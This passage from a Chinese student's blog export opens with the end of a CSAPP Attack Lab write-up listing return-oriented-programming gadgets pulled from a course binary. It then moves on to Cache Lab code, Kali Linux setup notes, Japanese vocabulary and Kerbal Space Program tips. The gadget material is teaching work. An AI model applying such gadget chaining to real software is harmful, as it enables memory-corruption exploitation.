class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401a03 &lt;addval_190&gt;:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3                    retq<br>00000000004019d6 &lt;add_xy&gt;:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq<br>00000000004019a0 &lt;addval_273&gt;:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3                    retq<br></code></pre></td></tr></table></figure><p>提取后:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">401a06: 48 89 e0              movq %rsp, %rax<br>401a09: c3                    retq<br><br>4019d8: 04 37                 add 0x37, %al<br>4019da: c3                    retq<br><br>4019a2: 48 89 c7              movq %rax, %rdi<br>4019a5: c3                    retq<br></code></pre></td></tr></table></figure><p>结束.</p></li></ol><h2 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h2><h3 id="1-Part-A"><a href="#1-Part-A" class="headerlink" title="1)Part A"></a>1)Part A</h3><p>就，没什么可说的，白嫖真香。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">mem_addr_t</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>&#123;</span><br>    <span class="hljs-keyword">mem_addr_t</span> tag;<br>    <span class="hljs-keyword">int</span> valid;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> lru; <br>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>* <span class="hljs-title">cache_set_t</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">cache_set_t</span>* <span class="hljs-keyword">cache_t</span>;<br><br><span class="hljs-keyword">cache_t</span> cache;<br><span class="hljs-keyword">mem_addr_t</span> set_index_mask = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accessData</span><span class="hljs-params">(<span class="hljs-keyword">mem_addr_t</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> eviction_line;<br>  <span class="hljs-comment">// 注意是无符号整数</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> eviction_lru = <span class="hljs-number">-1</span>;<br>  eviction_line = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">mem_addr_t</span> tag = addr &gt;&gt; (s + b);<br>  <span class="hljs-keyword">cache_set_t</span> cache_set = cache[(addr &gt;&gt; b) &amp; set_index_mask];<br><br>  <span class="hljs-comment">// 所需数据的cache_line编号</span><br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-comment">// 如果把所有的cache_line全遍历完了还找不到所需的数据</span><br>    <span class="hljs-keyword">if</span> ( i &gt;= E )<br>    &#123;<br>      <span class="hljs-comment">// 数据未命中</span><br>      ++miss_count;<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;miss &quot;</span>);<br>      <span class="hljs-comment">// 在一组cache_line中查找将被删除的cache_line</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> ia = <span class="hljs-number">0</span>; ia &lt; E; ++ia )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( cache_set[ia].lru &lt; eviction_lru )<br>        &#123;<br>          eviction_line = ia;<br>          eviction_lru = cache_set[ia].lru;<br>        &#125;<br>     &#125;<br>      <span class="hljs-comment">// 如果当前这个要被删除的cache_line是valid</span><br>      <span class="hljs-comment">// 即，这个要被替换数据的cache_line是一条之前读入的数据而不是空行</span><br>      <span class="hljs-keyword">if</span> ( cache_set[eviction_line].valid )<br>      &#123;<br>        <span class="hljs-comment">// 删除数+1</span><br>        ++eviction_count;<br>        <span class="hljs-keyword">if</span> ( verbosity )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;eviction &quot;</span>);<br>      &#125;<br>      <span class="hljs-comment">// 模拟从**主存**读入并覆盖数据到这个刚刚被删除（或本来是空行）的cache_line里</span><br>      cache_set[eviction_line].valid = <span class="hljs-number">1</span>;<br>      cache_set[eviction_line].tag = tag;<br>      cache_set[eviction_line].lru = lru_counter++;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 查找cache中的数据</span><br>    <span class="hljs-keyword">if</span> ( cache_set[i].tag == tag &amp;&amp; cache_set[i].valid )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-comment">// 如果找到数据了，自然就hit_count++</span><br>  ++hit_count;<br>  <span class="hljs-keyword">if</span> ( verbosity )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hit &quot;</span>);<br>  cache_set[i].lru = lru_counter++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">replayTrace</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *trace_fn)</span></span><br><span class="hljs-function"></span>&#123;<br>  FILE * trace_fp = fopen(trace_fn, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !trace_fp )<br>  &#123;<br>    <span class="hljs-keyword">int</span>* err_num = __errno_location();<br>    <span class="hljs-keyword">char</span>* err_str = strerror(*err_num);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, trace_fn, err_str);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1000</span>];<br>  <span class="hljs-keyword">while</span> ( fgets(buf, <span class="hljs-number">1000</span>, trace_fp) )<br>  &#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">mem_addr_t</span> addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;S&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;L&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>    &#123;<br>      <span class="hljs-built_in">sscanf</span>(&amp;buf[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;%llx,%u&quot;</span>, &amp;addr, &amp;len);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %llx,%u &quot;</span>, buf[<span class="hljs-number">1</span>], addr, len);<br>      <span class="hljs-comment">// 读取/写入数据</span><br>      <span class="hljs-comment">// 写入数据同样需要判断数据是否存在与cache。如果数据不在，同样要将其读回cache</span><br>      accessData(addr);<br>      <span class="hljs-comment">// 如果当前指令是修改指令，则上一条accessData读取数据，下一条的accessData写入数据</span><br>      <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>        accessData(addr);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>  &#125;<br>  fclose(trace_fp);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Part-B"><a href="#2-Part-B" class="headerlink" title="2)Part B"></a>2)Part B</h3><h4 id="32-32"><a href="#32-32" class="headerlink" title="32*32:"></a>32*32:</h4><p>最优解法是非常暴力非常详细的写出每一行的移动情况，普通解法是规规矩矩的8分块。<a href="https://zhuanlan.zhihu.com/p/79058089">链接</a>_</p><h4 id="64-64"><a href="#64-64" class="headerlink" title="64*64:"></a>64*64:</h4><p>第一种解法是八分块然后再4分块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (M == <span class="hljs-number">64</span>)<br>&#123;<br><span class="hljs-keyword">int</span> i, j, x, y;<br><span class="hljs-keyword">int</span> x1, x2, x3, x4, x5, x6, x7, x8;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">8</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (x = i; x &lt; i + <span class="hljs-number">4</span>; ++x)<br>&#123;<br>x1 = A[x][j]; x2 = A[x][j+<span class="hljs-number">1</span>]; x3 = A[x][j+<span class="hljs-number">2</span>]; x4 = A[x][j+<span class="hljs-number">3</span>];<br>x5 = A[x][j+<span class="hljs-number">4</span>]; x6 = A[x][j+<span class="hljs-number">5</span>]; x7 = A[x][j+<span class="hljs-number">6</span>]; x8 = A[x][j+<span class="hljs-number">7</span>];<br><br>B[j][x] = x1; B[j+<span class="hljs-number">1</span>][x] = x2; B[j+<span class="hljs-number">2</span>][x] = x3; B[j+<span class="hljs-number">3</span>][x] = x4;<br>B[j][x+<span class="hljs-number">4</span>] = x5; B[j+<span class="hljs-number">1</span>][x+<span class="hljs-number">4</span>] = x6; B[j+<span class="hljs-number">2</span>][x+<span class="hljs-number">4</span>] = x7; B[j+<span class="hljs-number">3</span>][x+<span class="hljs-number">4</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (y = j; y &lt; j + <span class="hljs-number">4</span>; ++y)<br>&#123;<br>x1 = A[i+<span class="hljs-number">4</span>][y]; x2 = A[i+<span class="hljs-number">5</span>][y]; x3 = A[i+<span class="hljs-number">6</span>][y]; x4 = A[i+<span class="hljs-number">7</span>][y];<br>x5 = B[y][i+<span class="hljs-number">4</span>]; x6 = B[y][i+<span class="hljs-number">5</span>]; x7 = B[y][i+<span class="hljs-number">6</span>]; x8 = B[y][i+<span class="hljs-number">7</span>];<br><br>B[y][i+<span class="hljs-number">4</span>] = x1; B[y][i+<span class="hljs-number">5</span>] = x2; B[y][i+<span class="hljs-number">6</span>] = x3; B[y][i+<span class="hljs-number">7</span>] = x4;<br>B[y+<span class="hljs-number">4</span>][i] = x5; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">1</span>] = x6; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">2</span>] = x7; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">3</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (x = i + <span class="hljs-number">4</span>; x &lt; i + <span class="hljs-number">8</span>; ++x)<br>&#123;<br>x1 = A[x][j+<span class="hljs-number">4</span>]; x2 = A[x][j+<span class="hljs-number">5</span>]; x3 = A[x][j+<span class="hljs-number">6</span>]; x4 = A[x][j+<span class="hljs-number">7</span>];<br>B[j+<span class="hljs-number">4</span>][x] = x1; B[j+<span class="hljs-number">5</span>][x] = x2; B[j+<span class="hljs-number">6</span>][x] = x3; B[j+<span class="hljs-number">7</span>][x] = x4;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二种解法在那个链接里的评论区里1024次miss, 未看.</p><h4 id="61-67"><a href="#61-67" class="headerlink" title="61*67:"></a>61*67:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">16</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">16</span>)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = i; k &lt; i + <span class="hljs-number">16</span> &amp;&amp; k &lt; N; ++k)<br>        &#123;<br>            <span class="hljs-keyword">int</span> temp_position = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">int</span> temp_value = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">int</span> l;<br>            <span class="hljs-keyword">for</span> (l = j; l &lt; j + <span class="hljs-number">16</span> &amp;&amp; l &lt; M; ++l)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (l == k) <span class="hljs-comment">/* 横坐标等于纵坐标，局部变量暂存，整个block读完再处理 */</span><br>                &#123;<br>                    temp_position = k;<br>                    temp_value = A[k][k];<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    B[l][k] = A[k][l];<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (temp_position != <span class="hljs-number">-1</span>) <span class="hljs-comment">/* 遇到了冲突元素 */</span> <br>            &#123;<br>                B[temp_position][temp_position] = temp_value;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="其他链接"><a href="#其他链接" class="headerlink" title="其他链接"></a>其他链接</h3><p>附上手算miss率的神人<a href="https://zhuanlan.zhihu.com/p/28585726">专栏</a>. 以及CMU的<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">课件</a>, miss次数好像就是这上面的.</p><h2 id="ShellLab"><a href="#ShellLab" class="headerlink" title="ShellLab"></a>ShellLab</h2>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>折腾出来的问题(linux)</title>
    <link href="/2021-05/Learning-%E6%8A%98%E8%85%BE%E5%87%BA%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98-linux/"/>
    <url>/2021-05/Learning-%E6%8A%98%E8%85%BE%E5%87%BA%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98-linux/</url>
    
    <content type="html"><![CDATA[<h2 id="Kali的问题-linux命令"><a href="#Kali的问题-linux命令" class="headerlink" title="Kali的问题(linux命令):"></a>Kali的问题(linux<a href="https://www.runoob.com/linux/linux-command-manual.html">命令</a>):</h2><ul><li>虚拟机的安装(又装了一遍)</li><li>VMtools的安装(为什么网上会有这么多的<a href="https://blog.csdn.net/love20165104027/article/details/83377758">方法</a>.</li><li>中文输入法Ibus的<a href="https://www.cnblogs.com/donghao0924/p/13503595.html">安装(</a>两行命令解决的事情有些教程搞得几十行,就离谱)</li><li>vim插件(彻底的失败) 不过在vim设置文件里设置了几个<a href="https://blog.csdn.net/lovewebeye/article/details/79960675">常用的</a>.</li><li>密码问题, root初始密码忘记, root下passwd指令.   默认账号kali kali</li><li>vim在share文件夹里</li><li>中文输入法出现[Invalid-UTF-8 code], 改成半角中文即可</li><li>make btest出错, 修改Makefile为生成64位可执行文件<a href="https://blog.csdn.net/mazamu/article/details/107021054">[0]</a>.</li><li>LInux中可执行文件和后缀名无关, 和文件的属性有关(????</li><li>bitset是一个类模板</li><li>GDB以及gcc的<a href="https://zhuanlan.zhihu.com/p/74897601">使用</a>(详见零碎知识)</li><li>kali如何运行可执行文件: ./bomb</li><li>set nohlsearch(no highlight search)</li><li>中文输入法下输入命令:w按下回车vim会卡死, <strong>输入逗号也能卡死?????</strong></li><li>kali装Chrome:他有sandbox机制, 无法在root用户下运行<a href="https://www.cnblogs.com/smart-zihan/p/13440084.html">[1]</a>.</li><li>kali使用vpn:  <strong>失败</strong>.</li><li>kill占了端口的进程<a href="https://blog.csdn.net/weixin_42108437/article/details/106072810">[0]</a>.</li><li>虚拟机卡死时查找log文件里的pid, 在任务管理器里停止</li><li>查看磁盘使用情况<a href="https://www.cnblogs.com/flyingeagle/articles/9219106.html">[0]</a>.</li><li>Typora的安装<a href="https://blog.csdn.net/qq_33694648/article/details/104403618">问题</a>.</li><li>.tar文件相关<a href="https://zhidao.baidu.com/question/873537413743808372.html">问题</a>.</li><li>root用户安装了vmtool, 切换到lbjyye后需要重新安装(?)</li><li>修改命令行终端字体大小: ~/.config/qterminal.org/qterminal.ini 里的fontsize或fontfamily并将其改为只读文件(<strong>新版完全没这个问题</strong>)</li><li>要显示隐藏文件夹直接到工具栏上的视图里去找</li><li><a href="https://blog.csdn.net/Cappuccino_jay/article/details/105474581">延长</a>锁屏时间</li><li>终端补全只要方向键</li><li>关机命令 init 0</li><li>chorme里<a href="https://jingyan.baidu.com/article/75ab0bcb8547fed6864db2f8.html">添加</a>搜索引擎</li><li>vim无法打开文件, <a href="https://blog.csdn.net/qq_38238114/article/details/78524043">改为</a>下载GVIM</li><li>啥玩意儿啊, kali2021干吗搞没了图形界面clash弄半天也没成<a href="https://dcrelay.me/#/knowledge">[0]</a></li><li>main函数的两个参数: 一个是命令参数的个数, 另一个是命令参数数组,argv[0]是程序本身的文件名</li><li>快照管理其中的保留是防止自动保存的快照被删除</li><li>**Typora里使用中文状态下的Ctrl+A, 文件直接丢失!!!!**太特么蠢了.</li><li>/usr/share/vim/vim82/colors/有vim的主题<ul><li>industry 全黑,  evening 还行, koel 超级黑的背景, morning 灰白很不错, murpy又是黑的字体细点,  peachpuff 桃色背景, shine 亮瞎狗眼 颜色太浅, slate 字体太紧, zellner 平平无奇的白底, 剩下的不用考虑</li></ul></li><li>了解了链接引用和脚注是个<a href="https://www.cnblogs.com/hnrainll/p/3514637.html">啥</a>.</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>日本語</title>
    <link href="/2021-05/Learning-%E6%97%A5%E6%9C%AC%E8%AA%9E/"/>
    <url>/2021-05/Learning-%E6%97%A5%E6%9C%AC%E8%AA%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="外来语"><a href="#外来语" class="headerlink" title="外来语"></a>外来语</h2><p><a href="https://www.ixueshu.com/document/52df575bd5734312318947a18e7f9386.html">外来语的转换</a>.</p><h2 id="易忘"><a href="#易忘" class="headerlink" title="易忘"></a>易忘</h2><h5 id="第四课"><a href="#第四课" class="headerlink" title="第四课"></a>第四课</h5><p>居間　いま　起居室</p><p>箱　はこ</p><p>上下左右<strong>前’後ろ’</strong>中<u>外</u>　:　うえ　した　ひだり　みぎ　<strong>まえ　’うしろ’</strong>　なか　<u>そと</u></p><p>売店　ばいてん　小卖部</p><p>います　「动2」</p><h5 id="第五课"><a href="#第五课" class="headerlink" title="第五课"></a>第五课</h5><p>終わります　おわります</p><p>起きます        おきます</p><p>遅刻　ちこく</p><p>おととい➡昨日（きのう）↦今日（きょう）⇒明日（あした）⇒明後日（あさって）(后天)</p><h5 id="第八课"><a href="#第八课" class="headerlink" title="第八课"></a>第八课</h5><p>夕方　ゆうがた　傍晚</p><p>チョコレ<strong>ー</strong>ト、スプ<strong>ー</strong>ン、アイスクリ<strong>ー</strong>ム</p><p>昼休み　ひるやすみ</p><p>番号        ばんご<strong>う</strong>.</p><p>送ります　おくります</p><p>作ります　つくります</p><p>太ります　ふとります</p><p>出します　だします</p><p>会います　あいます　见面</p><p>かけます　打电话</p><p>もらいます　得到</p><p>あげます　给</p><p>​            ————<strong>基本全部不记得</strong>.</p><h5 id="第十四课"><a href="#第十四课" class="headerlink" title="第十四课"></a>第十四课</h5><p>洗います　あらいます</p><h5 id="第十六课"><a href="#第十六课" class="headerlink" title="第十六课"></a>第十六课</h5><p>直します　なおします</p><p>知ります　しります</p><p>長い　ながい　3</p><p>短い　みじかい　3</p><p>軽い　かるい　2</p><h2 id="特殊的い段二类动词"><a href="#特殊的い段二类动词" class="headerlink" title="特殊的い段二类动词"></a>特殊的い段二类动词</h2><p><strong>标日初级全册出现过的：</strong></p><p>見ますmi 看见</p><p>感じますka n 感觉，觉得，感到，感想，感动</p><p>通じますtsu u 通，通往，通晓，精通，熟悉，领会，相通，通用</p><p>信じますshi n 相信，信仰</p><p>過ぎますsu 经过，过去，逝去，超过，过分，过度，过火生(活)</p><p>きますi 活，生活，生存，保存生命，谋生，生动，栩栩如生，有效，有意义</p><p>起きますo 起床，起来，睡醒，事件发生</p><p>出来（でき）ます做好，做完，建成，形成，出现，发生，出产，能够</p><p>下りますo着陆，上锁，消除，卸下，排泄，落下，卸下烦恼 </p><p>降りますo 下来，降落，辞职，退出落(堕)</p><p>ちますo 落下，坠落，脱落，褪色，低落，陷落，被攻陷，衰落，落榜，逃走，遗漏</p><p>借りますka 借，租借，借用，利用</p><p>浴びまa bi 浇，淋，浴，照，晒，受到，蒙受，遭到</p><p>居（い）ます在</p><p>着ますki 穿，承受</p><p>似ますni 相似像</p><p>足ります ta 够，足够，能够，值得，可以，充分，足以</p><h4 id="上册出现过的"><a href="#上册出现过的" class="headerlink" title="上册出现过的"></a>上册出现过的</h4><p>浴びます（浇,淋,浴）、います（有）、起きます（起床）、降ります（下）、借ります（借）、着ます（穿）、過ぎます（过）、できます（会,能）、見ます（看）</p>]]></content>
    
    
    <categories>
      
      <category>日本語</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日本語</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerbal Space Program</title>
    <link href="/1900-06/%E6%88%91%E4%B9%9F%E8%AF%B4%E4%B8%8D%E6%B8%85%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88-KerbalSpaceProgram/"/>
    <url>/1900-06/%E6%88%91%E4%B9%9F%E8%AF%B4%E4%B8%8D%E6%B8%85%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88-KerbalSpaceProgram/</url>
    
    <content type="html"><![CDATA[<h3 id="建造"><a href="#建造" class="headerlink" title="建造"></a>建造</h3><ol><li>降落伞气压的0.2 0.75是以大气压为单位, 20KPa/101KPa</li><li>我们需要做的最后一件事,就是提高火箭的<strong>稳定性</strong>,让它按照我们指定的方向前进。为此,我们需要在火箭底部安装几个<strong>尾翼</strong>。尾翼位于空气动力标签下。</li><li>按住LShift会更精细的角度控制</li><li>高级教程:<ul><li>安装RCS燃料箱, 或许不需要用到所有燃料, 调小一点</li><li>上面级的最后一个主要部件是引擎。<strong>“猎犬”引擎</strong>在低海拔中几乎没有任何推进力·但在太空中效率极高(<strong>20千米以上</strong>,大气足够稀薄,不会影响排气)。因此·它很适合上面级. 因此引擎在火箭到达适合其工作的环境之前, 都不会被激活。</li><li>RCS最好放在质量中心的位置, 但是鉴于满载和空载的质量中心是不一样的, 所以要选取一个<strong>折中点</strong>.</li><li>电力: 在上面级四周安装几个太阳能<strong>电池板</strong>和<strong>电池组</strong>.</li><li>推力限制, 当然如果有更适合的推力的引擎更好, 固体燃料引擎也可以</li><li>中止: 但是千万注意开伞安全!(部件自行分离<strong>并不会激活其分级</strong>﹐故可能需要多次后动分级</li></ul></li></ol><h3 id="亚轨道飞行"><a href="#亚轨道飞行" class="headerlink" title="亚轨道飞行"></a>亚轨道飞行</h3><ol><li>节流阀开到三分之二</li><li>50-150–80度, 250-400–70度</li><li>反方向进入大气</li></ol><h3 id="轨道飞行"><a href="#轨道飞行" class="headerlink" title="轨道飞行"></a>轨道飞行</h3><ol><li>节流阀直接开到最大</li><li>6000米60度, 然后一直水平线上面一点</li><li>直到最高点到达80公里超过kerbin大气十公里, 等待</li><li>安全返航需要转向180°来逆向加速﹐直到近点低于20千米。下降到这个高度后大气会帮你完成大部分减速。到达<strong>大气层边缘</strong>后﹐启动分级,丢弃火箭上面级,指向逆向·像我在飞行基础教程中教你的那样再入大气。</li></ol><h4 id="Gravity-Turn"><a href="#Gravity-Turn" class="headerlink" title="Gravity Turn"></a>Gravity Turn</h4><ul><li>The strength of gravity on the local body also comes into effect. On bodies with very strong gravity wells, a larger portion of thrust must be spent fighting gravity, leaving a smaller portion of thrust to spend gaining altitude and lateral speed. On such a body, that means a high turn at a narrow angle. Conversely, on a body with very light gravity, the turn can be low at a sharper angle. The craft’s TWR also affects when to begin a turn. Craft with very high TWRs will have plenty of thrust to spare, so they can spend a tiny percentage of their thrust fighting gravity and a much larger percentage gaining lateral speed. This means that such a craft can make their gravity turns lower and sharper than a craft with a low TWR, and also means a faster, more efficient ascending with lower Δv cost.</li><li></li></ul><h3 id="飞向Mun-降落-返回"><a href="#飞向Mun-降落-返回" class="headerlink" title="飞向Mun, 降落, 返回"></a>飞向Mun, 降落, 返回</h3><ol><li>调节机动节点, 在我们的例子中,我们想把远点向外移动,使其恰好在距离Mun当前位置前<strong>大约45度的位置</strong>与Mun的轨道交叉。在远点调近点为50km左右. </li><li>逆向重力转弯, 保持速度是高度的<strong>十分之一(别盯着海拔看, 一定要看地面高度)</strong>,三分之一节流阀,近点<u>六千米</u>, G打开起落架<ul><li><em>在低节流阀状态下执行机动。</em>时间加速到新的<strong>近点</strong>(到了再说)。</li><li>在中节流阀状态下逆向加速,降低速度和高度﹖直到距离地面仅1.5千米。</li><li>按照节奏控制飞船减速(<strong>每10米高度, 减少1米/秒速度</strong>)。</li><li>在Mun地面平缓降落!</li><li>the full-power deceleration (retrogade burn (<img src="https://wiki.kerbalspaceprogram.com/images/thumb/c/cb/Retrograde-darker.svg/16px-Retrograde-darker.svg.png" style="zoom:150%;" />) has to be started as late as possible to be finished turning to vertical just above the surface. </li></ul></li><li>起飞后直接转向到15度, </li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>ゲーム</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
